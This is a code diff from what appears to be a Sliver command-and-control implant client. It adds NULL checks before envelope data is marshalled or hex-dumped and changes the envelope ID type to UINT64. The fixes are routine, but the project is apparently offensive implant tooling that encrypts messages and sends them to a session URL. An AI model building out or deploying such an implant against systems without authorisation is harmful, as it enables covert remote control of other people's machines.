@@ -226,7 +226,9 @@ PBUFFER MarshalEnvelope
 	}
 
 	if (!pEnvelope->uUnknownMessageType) {
-		ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
+		if (pEnvelope->pData != NULL) {
+			ElementList[2] = CreateBytesElement(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer, 3);
+		}
 	}
 	else {
 		ElementList[3] = CreateVarIntElement(TRUE, 4);
@@ -337,11 +339,16 @@ BOOL WriteEnvelope
 	PHTTP_RESP pResp = NULL;
 	BOOL Result = FALSE;
 
-	wprintf(L"Write Envelope:\n");
-	HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+	if (pEnvelope->pData != NULL) {
+		wprintf(L"Write Envelope:\n");
+		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
+	}
+	else {
+		wprintf(L"Write Envelope: []\n");
+	}
+
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
 	pCipherText = SessionEncrypt(pSliverClient, pMarshalledEnvelope->pBuffer, pMarshalledEnvelope->cbBuffer, &cbCipherText);
-	
 	lpUri = CreateSessionURL(pSliverClient);
 	if (lpUri == NULL) {
 		goto CLEANUP;
@@ -522,7 +529,7 @@ PENVELOPE CreateErrorRespEnvelope
 (
 	_In_ LPSTR lpErrorDesc,
 	_In_ DWORD dwFieldIdx,
-	_In_ DWORD dwEnvelopeID
+	_In_ UINT64 uEnvelopeID
 )
 {
 	DWORD cbMarshalledFieldIdx = 0;
@@ -541,7 +548,7 @@ PENVELOPE CreateErrorRespEnvelope
 	pResult->pData->pBuffer = FinalElement->pMarshalledData;
 	FinalElement->pMarshalledData = NULL;
 	FinalElement->cbMarshalledData = 0;
-	pResult->uID = dwEnvelopeID;
+	pResult->uID = uEnvelopeID;
 	
 	FreeElement(ElementList[0]);
 	FreeElement(FinalElement);
